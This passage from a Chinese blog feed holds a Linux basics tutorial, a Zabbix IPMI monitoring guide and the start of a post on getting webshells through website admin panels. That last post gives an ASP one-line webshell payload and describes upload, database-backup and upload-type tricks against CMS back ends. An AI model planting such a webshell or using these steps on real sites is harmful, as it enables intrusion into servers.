&lt;p&gt;adduser 和 useradd 的区别是什么？&lt;br/&gt;答：useradd 只创建用户，创建完了用 passwd yilezhu 去设置新用户的密码。adduser 会创建用户，创建目录，创建密码（提示你设置），做这一系列的操作。其实 useradd、userdel 这类操作更像是一种命令，执行完了就返回。而 adduser 更像是一种程序，需要你输入、确定等一系列操作&lt;/p&gt;
&lt;h2 id=&quot;linux-文件权限&quot;&gt;Linux 文件权限&lt;/h2&gt;
&lt;h3 id=&quot;查看文件权限&quot;&gt;查看文件权限&lt;/h3&gt;
&lt;p&gt;使用较长格式列出文件：&lt;/p&gt;
&lt;p&gt;$ ls -l&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190127142637874-1612084057.jpg&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;显示除了 .（当前目录）和 ..（上一级目录）之外的所有文件，包括隐藏文件（Linux 下以 . 开头的文件为隐藏文件）。&lt;/p&gt;
&lt;p&gt;$ ls -A&lt;/p&gt;
&lt;p&gt;查看某一个目录的完整属性，而不是显示目录里面的文件属性：&lt;/p&gt;
&lt;p&gt;$ ls -dl &amp;lt;目录名&amp;gt;&lt;/p&gt;
&lt;p&gt;显示所有文件大小，并以普通人类能看懂的方式呈现：&lt;/p&gt;
&lt;p&gt;$ ls -AsSh&lt;/p&gt;
&lt;p&gt;其中小 s 为显示文件大小，大 S 为按文件大小排序，若需要知道如何按其它方式排序，请使用“man”命令查询。&lt;/p&gt;
&lt;h3 id=&quot;变更文件所有者&quot;&gt;变更文件所有者&lt;/h3&gt;
&lt;p&gt;假设目前是 yilezhu 用户登录，新建一个文件，命名为 “ huawei ”：&lt;/p&gt;
&lt;p&gt;$ touch huawei&lt;/p&gt;
&lt;p&gt;现在，换回到 root 用户身份，使用以下命令变更文件所有者为 root ：&lt;/p&gt;
&lt;p&gt;$ cd /home/yilezhu&lt;/p&gt;
&lt;p&gt;$ ls huawei&lt;/p&gt;
&lt;p&gt;$ sudo chown root huawei&lt;/p&gt;
&lt;p&gt;3.3 修改文件权限&lt;/p&gt;
&lt;p&gt;如果你有一个自己的文件不想被其他用户读、写、执行，那么就需要对文件的权限做修改，这里有两种方式：&lt;/p&gt;
&lt;p&gt;方式一：二进制数字表示&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190127142637071-958877106.jpg&quot; alt=&quot;img&quot;/&gt;&lt;/p&gt;
&lt;p&gt;每个文件的三组权限（拥有者，所属用户组，其他用户，记住这个顺序是一定的）对应一个 &quot; rwx &quot;，也就是一个 “ 7 ” ，所以如果我要将文件“ huawei ”的权限改为只有我自己可以用那么就这样：&lt;/p&gt;
&lt;p&gt;为了演示，我先在文件里加点内容：&lt;/p&gt;
&lt;p&gt;$ echo &quot;echo &quot;hello root&quot;&quot; &amp;gt; huawei&lt;/p&gt;
&lt;p&gt;然后修改权限：&lt;/p&gt;
&lt;p&gt;$ chmod 700 huawei&lt;/p&gt;
&lt;p&gt;方式二：加减赋值操作&lt;/p&gt;
&lt;p&gt;完成上述相同的效果，你可以：&lt;/p&gt;
&lt;p&gt;$ chmod go-rw huawei&lt;/p&gt;
&lt;p&gt;g、o 还有 u 分别表示 group、others 和 user，+ 和 - 分别表示增加和去掉相应的权限。&lt;/p&gt;
&lt;h2 id=&quot;linux-目录结构&quot;&gt;Linux 目录结构&lt;/h2&gt;
&lt;h3 id=&quot;fhs-标准&quot;&gt;FHS 标准&lt;/h3&gt;
&lt;p&gt;FHS 定义了两层规范，第一层是， / 下面的各个目录应该要放什么文件数据，例如 /etc 应该放置设置文件，/bin 与 /sbin 则应该放置可执行文件等等。&lt;/p&gt;
&lt;p&gt;第二层则是针对 /usr 及 /var 这两个目录的子目录来定义。例如 /var/log 放置系统登录文件，/usr/share 放置共享数据等等。&lt;/p&gt;
&lt;p&gt;sudo apt-get update&lt;/p&gt;
&lt;p&gt;sudo apt-get install tree&lt;/p&gt;
&lt;p&gt;列出所有文件&lt;/p&gt;
&lt;p&gt;$ tree /&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190127142636340-1170916555.png&quot; alt=&quot;1548566340156&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;目录路径&quot;&gt;目录路径&lt;/h3&gt;
&lt;p&gt;路径&lt;/p&gt;
&lt;p&gt;使用 cd 命令可以切换目录，在 Linux 里面使用 . 表示当前目录，.. 表示上一级目录（注意，我们上一节介绍过的，以 . 开头的文件都是隐藏文件，所以这两个目录必然也是隐藏的，你可以使用 ls -a 命令查看隐藏文件）, - 表示上一次所在目录，～ 通常表示当前用户的 home 目录。使用 pwd 命令可以获取当前所在路径（绝对路径）。&lt;/p&gt;
&lt;p&gt;进入上一级目录：&lt;/p&gt;
&lt;p&gt;$ cd ..&lt;/p&gt;
&lt;p&gt;进入你的 home 目录：&lt;/p&gt;
&lt;p&gt;$ cd ~&lt;/p&gt;
&lt;p&gt;或者 cd /home/&amp;lt;你的用户名&amp;gt;&lt;/p&gt;
&lt;p&gt;使用 pwd 获取当前路径：&lt;/p&gt;
&lt;p&gt;$ pwd&lt;/p&gt;
&lt;p&gt;绝对路径&lt;/p&gt;
&lt;p&gt;关于绝对路径，简单地说就是以根&quot; / &quot;目录为起点的完整路径，以你所要到的目录为终点，表现形式如：&lt;/p&gt;
&lt;p&gt;/usr/local/bin，表示根目录下的 usr 目录中的 local 目录中的 bin 目录。&lt;/p&gt;
&lt;p&gt;相对路径&lt;/p&gt;
&lt;p&gt;相对路径，也就是相对于你当前的目录的路径，相对路径是以当前目录 . 为起点，以你所要到的目录为终点，表现形式如：&lt;/p&gt;
&lt;p&gt;usr/local/bin （这里假设你当前目录为根目录）。你可能注意到，我们表示相对路径实际并没有加上表示当前目录的那个 . ，而是直接以目录名开头，因为这个 usr 目录为 / 目录下的子目录，是可以省略这个 . 的（以后会讲到一个类似不能省略的情况）；如果是当前目录的上一级目录，则需要使用 .. ，比如你当前目录为 home 目录，根目录就应该表示为 ../../ ，表示上一级目录（ home 目录）的上一级目录（ / 目录）。&lt;/p&gt;
&lt;p&gt;下面我们以你的 home目录为起点，分别以绝对路径和相对路径的方式进入 /usr/local/bin 目录：&lt;/p&gt;
&lt;p&gt;绝对路径&lt;/p&gt;
&lt;p&gt;$ cd /usr/local/bin&lt;/p&gt;
&lt;p&gt;相对路径&lt;/p&gt;
&lt;p&gt;$ cd ../../usr/local/bin&lt;/p&gt;
&lt;p&gt;提示：在进行目录切换的过程中请多使用 Tab 键自动补全，可避免输入错误，连续按两次 Tab 可以显示全部候选结果。&lt;/p&gt;
&lt;h2 id=&quot;linux-文件的基本操作&quot;&gt;Linux 文件的基本操作&lt;/h2&gt;
&lt;h3 id=&quot;新建&quot;&gt;新建&lt;/h3&gt;
&lt;p&gt;新建空白文件&lt;/p&gt;
&lt;p&gt;使用 touch 命令创建空白文件，关于 touch 命令，其主要作用是来更改已有文件的时间戳的（比如，最近访问时间，最近修改时间），但其在不加任何参数的情况下，只指定一个文件名，则可以创建一个指定文件名的空白文件（不会覆盖已有同名文件），当然你也可以同时指定该文件的时间戳&lt;/p&gt;
&lt;p&gt;新建目录&lt;/p&gt;
&lt;p&gt;使用 mkdir（make directories）命令可以创建一个空目录，也可同时指定创建目录的权限属性。&lt;/p&gt;
&lt;p&gt;创建名为“ mydir ”的空目录：&lt;/p&gt;
&lt;p&gt;$ mkdir mydir&lt;/p&gt;
&lt;p&gt;使用 -p 参数，同时创建父目录（如果不存在该父目录），如下我们同时创建一个多级目录（这在安装软件、配置安装路径时非常有用）：&lt;/p&gt;
&lt;p&gt;$ mkdir -p father/son/grandson&lt;/p&gt;
&lt;h3 id=&quot;复制&quot;&gt;复制&lt;/h3&gt;
&lt;p&gt;复制文件&lt;/p&gt;
&lt;p&gt;使用 cp（copy）命令复制一个文件到指定目录。&lt;/p&gt;
&lt;p&gt;将之前创建的“ test ”文件复制到“ /home/root/father/son/grandson ”目录中：&lt;/p&gt;
&lt;p&gt;$ cp test father/son/grandson&lt;/p&gt;
&lt;p&gt;复制目录&lt;/p&gt;
&lt;p&gt;如果直接使用 cp 命令复制一个目录的话，会出现如下错误：&lt;/p&gt;
&lt;p&gt;要成功复制目录需要加上 -r 或者 -R 参数，表示递归复制，就是说有点“株连九族”的意思：&lt;/p&gt;
&lt;p&gt;$ cp -r father family&lt;/p&gt;
&lt;h3 id=&quot;删除&quot;&gt;删除&lt;/h3&gt;
&lt;p&gt;删除文件&lt;/p&gt;
&lt;p&gt;使用 rm（remove files or directories）命令删除一个文件：&lt;/p&gt;
&lt;p&gt;$ rm test&lt;/p&gt;
&lt;p&gt;有时候你会遇到想要删除一些为只读权限的文件，直接使用 rm 删除会显示一个提示，如下：&lt;/p&gt;
&lt;p&gt;你如果想忽略这提示，直接删除文件，可以使用 -f 参数强制删除：&lt;/p&gt;
&lt;p&gt;$ rm -f test&lt;/p&gt;
&lt;p&gt;删除目录&lt;/p&gt;
&lt;p&gt;跟复制目录一样，要删除一个目录，也需要加上 -r 或 -R 参数：&lt;/p&gt;
&lt;p&gt;$ rm -r family&lt;/p&gt;
&lt;h3 id=&quot;移动文件与文件重命名&quot;&gt;移动文件与文件重命名&lt;/h3&gt;
&lt;p&gt;移动文件&lt;/p&gt;
&lt;p&gt;使用 mv（move or rename files）命令移动文件（剪切）。将文件“ file1 ”移动到 Documents 目录：&lt;/p&gt;
&lt;p&gt;mv 源目录文件 目的目录：&lt;/p&gt;
&lt;p&gt;$ mkdir Documents&lt;/p&gt;
&lt;p&gt;$ mv file1 Documents&lt;/p&gt;
&lt;p&gt;重命名文件&lt;/p&gt;
&lt;p&gt;将文件“ file1 ”重命名为“ myfile ”：&lt;/p&gt;
&lt;p&gt;mv 旧的文件名 新的文件名：&lt;/p&gt;
&lt;p&gt;$ mv file1 myfile&lt;/p&gt;
&lt;h3 id=&quot;查看文件&quot;&gt;查看文件&lt;/h3&gt;
&lt;p&gt;使用 cat，tac 和 nl 命令查看文件&lt;/p&gt;
&lt;p&gt;前两个命令都是用来打印文件内容到标准输出（终端），其中 cat 为正序显示，tac 为倒序显示。&lt;/p&gt;
&lt;p&gt;比如我们要查看之前从 /etc 目录下拷贝来的 passwd 文件：&lt;/p&gt;
&lt;p&gt;$ cat passwd&lt;/p&gt;
&lt;p&gt;可以加上 -n 参数显示行号：&lt;/p&gt;
&lt;p&gt;$ cat -n passwd&lt;/p&gt;
&lt;p&gt;nl 命令，添加行号并打印，这是个比 cat -n 更专业的行号打印命令。&lt;/p&gt;
&lt;p&gt;这里简单列举它的常用的几个参数：&lt;/p&gt;
&lt;p&gt;-b : 指定添加行号的方式，主要有两种：&lt;/p&gt;
&lt;p&gt;​ -b a:表示无论是否为空行，同样列出行号(&quot;cat -n&quot;就是这种方式)&lt;/p&gt;
&lt;p&gt;​ -b t:只列出非空行的编号并列出（默认为这种方式）&lt;/p&gt;
&lt;p&gt;-n : 设置行号的样式，主要有三种：&lt;/p&gt;
&lt;p&gt;​ -n ln:在行号字段最左端显示&lt;/p&gt;
&lt;p&gt;​ -n rn:在行号字段最右边显示，且不加 0&lt;/p&gt;
&lt;p&gt;​ -n rz:在行号字段最右边显示，且加 0&lt;/p&gt;
&lt;p&gt;-w : 行号字段占用的位数(默认为 6 位)&lt;/p&gt;
&lt;p&gt;使用 more 和 less 命令分页查看文件&lt;/p&gt;
&lt;p&gt;如果说上面的 cat 是用来快速查看一个文件的内容的，那么这个 more 和 less 就是天生用来&quot;阅读&quot;一个文件的内容的，比如说 man 手册内部就是使用的 less 来显示内容。其中 more 命令比较简单，只能向一个方向滚动，而 less 为基于 more 和 vi （一个强大的编辑器，我们有单独的课程来让你学习）开发，功能更强大&lt;/p&gt;
&lt;p&gt;使用 head 和 tail 命令查看文件&lt;/p&gt;
&lt;p&gt;$ tail /etc/passwd&lt;/p&gt;
&lt;p&gt;甚至更直接的只看一行， 加上 -n 参数，后面紧跟行数：&lt;/p&gt;
&lt;p&gt;$ tail -n 1 /etc/passwd&lt;/p&gt;
&lt;h3 id=&quot;查看文件类型&quot;&gt;查看文件类型&lt;/h3&gt;
&lt;p&gt;前面我提到过，在 Linux 中文件的类型不是根据文件后缀来判断的，我们通常使用 file 命令查看文件的类型：&lt;/p&gt;
&lt;p&gt;$ file /bin/ls&lt;/p&gt;
&lt;h3 id=&quot;搜索文件&quot;&gt;搜索文件&lt;/h3&gt;
&lt;p&gt;与搜索相关的命令常用的有 whereis，which，find 和 locate 。&lt;br/&gt;whereis 简单快速&lt;br/&gt;$whereis who&lt;br/&gt;locate 快而全&lt;br/&gt;它可以用来查找指定目录下的不同文件类型，如查找 /etc 下所有以 sh 开头的文件：&lt;br/&gt;$ locate /etc/sh&lt;br/&gt;注意，它不只是在 /etc 目录下查找，还会自动递归子目录进行查找。&lt;br/&gt;查找 /usr/share/ 下所有 jpg 文件：&lt;br/&gt;$ locate /usr/share/*.jpg&lt;br/&gt;注意要添加 * 号前面的反斜杠转义，否则会无法找到。&lt;br/&gt;如果想只统计数目可以加上 -c 参数，-i 参数可以忽略大小写进行查找，whereis 的 -b、-m、-s 同样可以使用。&lt;br/&gt;which 小而精&lt;br/&gt;which 本身是 Shell 内建的一个命令，我们通常使用 which 来确定是否安装了某个指定的软件，因为它只从 PATH 环境变量指定的路径中去搜索命令：&lt;br/&gt;$ which man&lt;br/&gt;find 精而细&lt;br/&gt;find 应该是这几个命令中最强大的了&lt;br/&gt;这条命令表示去 /etc/ 目录下面 ，搜索名字叫做 interfaces 的文件或者目录。这是 find 命令最常见的格式，千万记住 find 的第一个参数是要搜索的地方：&lt;br/&gt;$ sudo find /etc/ -name interfaces&lt;br/&gt;意 find 命令的路径是作为第一个参数的， 基本命令格式为 find [path] [option] [action] 。&lt;br/&gt;与时间相关的命令参数：&lt;br/&gt;参数 说明&lt;br/&gt;-atime 最后访问时间&lt;br/&gt;-ctime 最后修改文件内容的时间&lt;br/&gt;-mtime 最后修改文件属性的时间&lt;br/&gt;下面以 -mtime 参数举例：&lt;br/&gt;-mtime n：n 为数字，表示为在 n 天之前的“一天之内”修改过的文件&lt;br/&gt;-mtime +n：列出在 n 天之前（不包含 n 天本身）被修改过的文件&lt;br/&gt;-mtime -n：列出在 n 天之内（包含 n 天本身）被修改过的文件&lt;br/&gt;-newer file：file 为一个已存在的文件，列出比 file 还要新的文件名&lt;br/&gt;列出 home 目录中，当天（24 小时之内）有改动的文件：&lt;br/&gt;$ find ~ -mtime 0&lt;br/&gt;列出用户家目录下比 Code 文件夹新的文件：&lt;br/&gt;$ find ~ -newer /home/root/Code&lt;/p&gt;
&lt;h2 id=&quot;文件打包与压缩&quot;&gt;文件打包与压缩&lt;/h2&gt;
&lt;p&gt;文件后缀名 说明&lt;br/&gt;&lt;em&gt;.zip zip 程序打包压缩的文件&lt;br/&gt;&lt;/em&gt;.rar rar 程序压缩的文件&lt;br/&gt;&lt;em&gt;.7z 7zip 程序压缩的文件&lt;br/&gt;&lt;/em&gt;.tar tar 程序打包，未压缩的文件&lt;br/&gt;&lt;em&gt;.gz gzip 程序（GNU zip）压缩的文件&lt;br/&gt;&lt;/em&gt;.xz xz 程序压缩的文件&lt;br/&gt;&lt;em&gt;.bz2 bzip2 程序压缩的文件&lt;br/&gt;&lt;/em&gt;.tar.gz tar 打包，gzip 程序压缩的文件&lt;br/&gt;&lt;em&gt;.tar.xz tar 打包，xz 程序压缩的文件&lt;br/&gt;&lt;/em&gt;tar.bz2 tar 打包，bzip2 程序压缩的文件&lt;br/&gt;*.tar.7z tar 打包，7z 程序压缩的文件&lt;/p&gt;
&lt;h3 id=&quot;zip-压缩打包程序&quot;&gt;zip 压缩打包程序&lt;/h3&gt;
&lt;p&gt;使用 zip 打包文件夹：&lt;br/&gt;$ zip -r -q -o yilezhu.zip /home/root&lt;br/&gt;$ du -h yilezhu.zip&lt;br/&gt;$ file yilezhu.zip&lt;br/&gt;上面命令将目录 /home/root 打包成一个文件，并查看了打包后文件的大小和类型。第一行命令中，-r 参数表示递归打包包含子目录的全部内容，-q 参数表示为安静模式，即不向屏幕输出信息，-o，表示输出文件，需在其后紧跟打包输出文件名。后面使用 du 命令查看打包后文件的大小（后面会具体说明该命令）。&lt;br/&gt;设置压缩级别为 9 和 1（9 最大，1 最小），重新打包：&lt;br/&gt;$ zip -r -9 -q -o yilezhu_9.zip /home/root -x ~/&lt;em&gt;.zip&lt;br/&gt;$ zip -r -1 -q -o yilezhu_1.zip /home/root -x ~/&lt;/em&gt;.zip&lt;br/&gt;这里添加了一个参数用于设置压缩级别 -[1-9]，1 表示最快压缩但体积大，9 表示体积最小但耗时最久。最后那个 -x 是为了排除我们上一次创建的 zip 文件，否则又会被打包进这一次的压缩文件中，注意：这里只能使用绝对路径，否则不起作用。&lt;br/&gt;我们再用 du 命令分别查看默认压缩级别、最低、最高压缩级别及未压缩的文件的大小：&lt;br/&gt;$ du -h -d 0 *.zip ~ | sort&lt;br/&gt;通过 man 手册可知：&lt;br/&gt;h， --human-readable（顾名思义，你可以试试不加的情况）&lt;br/&gt;d， --max-depth（所查看文件的深度）&lt;/p&gt;
&lt;h3 id=&quot;使用-unzip-命令解压缩-zip-文件&quot;&gt;使用 unzip 命令解压缩 zip 文件&lt;/h3&gt;
&lt;p&gt;将 yilezhu.zip 解压到当前目录：&lt;br/&gt;$ unzip yilezhu.zip&lt;br/&gt;使用安静模式，将文件解压到指定目录：&lt;br/&gt;$ unzip -q yilezhu.zip -d ziptest&lt;br/&gt;上述指定目录不存在，将会自动创建。如果你不想解压只想查看压缩包的内容你可以使用 -l 参数：&lt;br/&gt;$ unzip -l yilezhu.zip&lt;br/&gt;使用 -O（英文字母，大写 o）参数指定编码类型：&lt;br/&gt;unzip -O GBK 中文压缩文件.zip（解决中文编码问题）&lt;/p&gt;
&lt;h3 id=&quot;rar-打包压缩命令&quot;&gt;rar 打包压缩命令&lt;/h3&gt;
&lt;p&gt;rar 也是 Windows 上常用的一种压缩文件格式，在 Linux 上可以使用 rar 和 unrar 工具分别创建和解压 rar 压缩包。&lt;/p&gt;
&lt;p&gt;安装 rar 和 unrar 工具：&lt;br/&gt;$ sudo apt-get update&lt;br/&gt;$ sudo apt-get install rar unrar&lt;br/&gt;从指定文件或目录创建压缩包或添加文件到压缩包：&lt;br/&gt;$ rm *.zip&lt;br/&gt;$ rar a yilezhu.rar .&lt;br/&gt;上面的命令使用 a 参数添加一个目录 ～ 到一个归档文件中，如果该文件不存在就会自动创建。&lt;br/&gt;注意：rar 的命令参数没有 -，如果加上会报错。&lt;br/&gt;从指定压缩包文件中删除某个文件：&lt;br/&gt;$ rar d yilezhu.rar .zshrc&lt;br/&gt;查看不解压文件：&lt;br/&gt;$ rar l yilezhu.rar&lt;br/&gt;使用 unrar 解压 rar 文件&lt;br/&gt;全路径解压：&lt;br/&gt;$ unrar x yilezhu.rar&lt;br/&gt;去掉路径解压：&lt;br/&gt;$ mkdir tmp&lt;br/&gt;$ unrar e yilezhu.rar tmp/&lt;/p&gt;
&lt;h3 id=&quot;tar-打包工具&quot;&gt;tar 打包工具&lt;/h3&gt;
&lt;p&gt;在 Linux 上面更常用的是 tar 工具，tar 原本只是一个打包工具，只是同时还是实现了对 7z、gzip、xz、bzip2 等工具的支持，这些压缩工具本身只能实现对文件或目录（单独压缩目录中的文件）的压缩，没有实现对文件的打包压缩，所以我们也无需再单独去学习其他几个工具，tar 的解压和压缩都是同一个命令，只需参数不同，使用比较方便。&lt;/p&gt;
&lt;p&gt;下面先掌握 tar 命令一些基本的使用方式，即不进行压缩只是进行打包（创建归档文件）和解包的操作。&lt;/p&gt;
&lt;p&gt;创建一个 tar 包：&lt;br/&gt;$ tar -cf yilezhu.tar ~&lt;/p&gt;
&lt;p&gt;上面命令中，-c 表示创建一个 tar 包文件，-f 用于指定创建的文件名，注意文件名必须紧跟在 -f 参数之后，比如不能写成 tar -fc yilezhu.tar，可以写成 tar -f yilezhu.tar -c ~。你还可以加上 -v 参数以可视的的方式输出打包的文件。上面会自动去掉表示绝对路径的 /，你也可以使用 -P 保留绝对路径符。&lt;/p&gt;
&lt;p&gt;解包一个文件（-x 参数）到指定路径的已存在目录（-C 参数）：&lt;br/&gt;$ mkdir tardir&lt;br/&gt;$ tar -xf yilezhu.tar -C tardir&lt;br/&gt;只查看不解包文件 -t 参数：&lt;br/&gt;$ tar -tf yilezhu.tar&lt;br/&gt;保留文件属性和跟随链接（符号链接或软链接），有时候我们使用 tar 备份文件当你在其他主机还原时希望保留文件的属性（-p 参数）和备份链接指向的源文件而不是链接本身（-h 参数）：&lt;br/&gt;$ tar -cphf etc.tar /etc&lt;br/&gt;对于创建不同的压缩格式的文件，对于 tar 来说是相当简单的，需要的只是换一个参数，这里我们就以使用 gzip 工具创建 *.tar.gz 文件为例来说明。&lt;/p&gt;
&lt;p&gt;我们只需要在创建 tar 文件的基础上添加 -z 参数，使用 gzip 来压缩文件：&lt;br/&gt;$ tar -czf yilezhu.tar.gz ~&lt;br/&gt;解压 &lt;em&gt;.tar.gz 文件：&lt;br/&gt;$ tar -xzf yilezhu.tar.gz&lt;br/&gt;现在我们要使用其它的压缩工具创建或解压相应文件只需要更改一个参数即可：&lt;br/&gt;压缩文件格式 参数&lt;br/&gt;&lt;/em&gt;.tar.gz -z&lt;br/&gt;&lt;em&gt;.tar.xz -J&lt;br/&gt;&lt;/em&gt;tar.bz2 -j&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;
&lt;p&gt;其实今天总结的内容挺多的，主要是因为对于我这个.NET Core开发者来说Linux是一个全新的领域，所以感觉需要记忆的内容太多太多了!而作为开发者，虽然不需要掌握Linux的核心优化等等内容，但是基本的操作还是需要掌握的，毕竟公司里面基本是开发运维的工作一肩挑的，所以，Linux我来了！&lt;br/&gt;后续在.net core程序进行在Linux系统上部署的话可能还需要涉及一些命令，这个后期用到了在进行记录吧！今天就先到这里了！感谢大家的阅读！&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 06:24:00 +0000</pubDate>
<dc:creator>依乐祝</dc:creator>
<og:description>用.NET Core开发也有一段时间了，但是由于工作原因一直都是在Windows系统上进行的开发，一直想学习Linux然后把.NET Core开发的程序跑在Linux上，然后把心得体会记录一下发布再博</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yilezhu/p/10326367.html</dc:identifier>
</item>
<item>
<title>Zabbix通过IPMI监控HPE服务器硬件 - 渣渣辉</title>
<link>http://www.cnblogs.com/Dev0ps/p/10326347.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Dev0ps/p/10326347.html</guid>
<description>&lt;div readability=&quot;13&quot;&gt;
&lt;p&gt;IPMI是智能型平台管理接口（Intelligent Platform Management Interface）的缩写，是管理基于 Intel结构的企业系统中所使用的外围设备采用的一种工业标准，该标准由英特尔、惠普、NEC、美国戴尔电脑和SuperMicro等公司制定。用户可以利用IPMI监视服务器的物理健康特征，如温度、电压、风扇工作状态、电源状态等。而且更为重要的是IPMI是一个开放的免费标准用户无需为使用该标准而支付额外的费用。&lt;br/&gt;上面的官话是百度百科抄来的，对我来说IPMI监控的优点是无论被监控服务器是否开启，无论被监控服务器装的是什么系统都可以持续监控服务器硬件状态。&lt;br/&gt;本文以HP DL380P G10为例，简述IPMI配置。&lt;/p&gt;
1、进入BOIS系统配置ILO的ip地址，接着在服务器面板上在到相关ILO账号密码：&lt;/div&gt;
&lt;div readability=&quot;9.8255033557047&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127140125597-1852754712.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;2、进入ILO管理页面将IPMI服务开启&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127140243781-731495602.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3、编辑/etc/zabbix/zabbix_server.conf&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
StartIPMIPollers=3
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;4、重启zabbix-server&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:python;gutter:true;&quot;&gt;
systemctl restart zabbix-server
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 5、添加host&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127140748802-1782887429.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;6、导入template&lt;/p&gt;
&lt;p&gt;下载地址：&lt;a href=&quot;https://github.com/hejianlai/Zabbix/archive/master.zip&quot; target=&quot;_blank&quot;&gt;https://github.com/hejianlai/Zabbix/archive/master.zip&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127141137564-934210707.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;7、设置IPMI信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127141307425-364641911.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;8、结果&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127141457163-1911415229.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1271786/201901/1271786-20190127141541860-872574987.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;/div&gt;
</description>
<pubDate>Sun, 27 Jan 2019 06:17:00 +0000</pubDate>
<dc:creator>渣渣辉</dc:creator>
<og:description>IPMI是智能型平台管理接口（Intelligent Platform Management Interface）的缩写，是管理基于 Intel结构的企业系统中所使用的外围设备采用的一种工业标准，该标</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Dev0ps/p/10326347.html</dc:identifier>
</item>
<item>
<title>网站后台getshell的方法总结 - v01cano</title>
<link>http://www.cnblogs.com/v01cano/p/10326318.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/v01cano/p/10326318.html</guid>
<description>&lt;h2 id=&quot;方法一直接上传getshell&quot;&gt;方法一：直接上传getshell&lt;/h2&gt;
&lt;p&gt;以dedecms为例，后台可以直接上传脚本文件，从而getshell，具体方法如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127124411998-1272770326.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;即可成功上传大马，并成功执行，从而拿下webshell。&lt;/p&gt;
&lt;p&gt;坑：通常由于权限限制，导致只有该目录权限，无法进入其他目录，此时便可以采用../跳转到根目录，或者其他目录，此时所采用的方法是如下的文件改名&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127124640319-697888225.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127124706254-1036891424.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法二数据库备份getshell&quot;&gt;方法二：数据库备份getshell&lt;/h2&gt;
&lt;p&gt;以南方数据cms为例：&lt;/p&gt;
&lt;p&gt;1，首先上传一张图片马上去，并且获取图片马的路径&lt;/p&gt;
&lt;p&gt;2，在系统管理处选择数据库备份，进行数据库备份getshell，具体操作方法如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127125020426-1050460725.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127125113975-1911179623.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127125136649-1951878273.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后使用菜刀连接即可成功getshell。&lt;/p&gt;
&lt;p&gt;当所备份的数据库来源无法修改时，我们可以通过首先将一句话木马写入数据库，比如通过新建管理员用户，将用户名用一句话木马代替（用户名通常有长度限制，在前端修改maxlength即可）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;%eval request (&quot;pass&quot;)%&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后再通过备份数据库getshell。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1587018/201901/1587018-20190127125542780-1745443850.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;方法三修改网站上传类型配置拿webshell&quot;&gt;方法三：修改网站上传类型配置拿webshell&lt;/h2&gt;
&lt;p&gt;有的网站在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型，如添加asp|php|jsp|aspx|asa|cer等来拿webshell。&lt;/p&gt;
&lt;h2 id=&quot;方法四利用文件解析漏洞来拿webshell&quot;&gt;方法四：利用文件解析漏洞来拿webshell&lt;/h2&gt;
